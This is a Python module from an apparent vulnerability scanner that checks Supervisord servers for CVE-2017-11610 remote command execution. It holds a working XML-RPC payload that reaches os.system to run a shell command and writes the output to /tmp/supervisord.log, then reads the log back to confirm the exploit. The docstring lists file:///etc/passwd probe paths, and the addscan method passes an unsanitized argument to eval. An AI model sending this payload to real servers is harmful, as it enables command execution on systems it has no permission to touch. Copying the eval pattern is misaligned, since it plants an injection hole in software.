#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
Supervisor是用Python开发的一套通用的进程管理程序, 能将一个普通的命令行进程变为后台daemon, 并监控进程状态, 异常退出时能自动重启;
是Linux/Unix系统下的一个进程管理工具, 不支持Windows系统;
    Supervisor扫描类: 
        1. Supervisord 远程命令执行
            CVE-2017-11610
                Payload: https://vulhub.org/#/environments/supervisor/CVE-2017-11610/

file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.api.dns import dns
from lib.initial.config import config
from lib.tool.md5 import md5, random_md5, random_int_1, random_int_2
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from thirdparty import requests
from time import sleep

class Supervisor():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Supervisor'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.random_num_1, self.random_num_2 = random_int_2(5)

        self.cve_2017_11610_payloads = [
            {
                'path': 'RPC2',
                'data': '''<?xml version='1.0'?>
<methodCall>
<methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>
<params>
<param>
<value><string>expr {} + {} | tee -a /tmp/supervisord.log</string></value>
</param>
</params>
</methodCall>'''.format(self.random_num_1, self.random_num_2)
            },
            {
                'path': 'RPC2',
                'data': '''<?xml version='1.0'?>
<methodCall>
<methodName>supervisor.readLog</methodName>
<params>
<param>
<value><int>0</int></value>
</param>
<param>
<value><int>0</int></value>
</param>
</params>
</methodCall>'''
            },
        ]

    def cve_2017_11610_scan(self, url):
        ''' Supervisord曝出了一个需认证的远程命令执行漏洞(CVE-2017-11610)
            通过POST请求向Supervisord管理界面提交恶意数据, 可以获取服务器操作权限, 带来严重的安全风险
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'RCE'
        vul_info['vul_id'] = 'CVE-2017-11610'
        # vul_info['vul_method'] = 'POST'
        vul_info['headers'] = {
            'Content-Type': 'text/xml'
        }

        headers = self.headers.copy()
        headers.update(vul_info['headers'])

        res_list = []

        for payload in self.cve_2017_11610_payloads:
            path = payload['path']
            data = payload['data']
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
                res_list.append(res)
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (str(self.random_num_1 + self.random_num_2) in res.text):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request-1': res_list[0],
                    'Request-2': res_list[1]
                }
                return results

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2017_11610_scan, url=url)
        ]

supervisor = Supervisor()
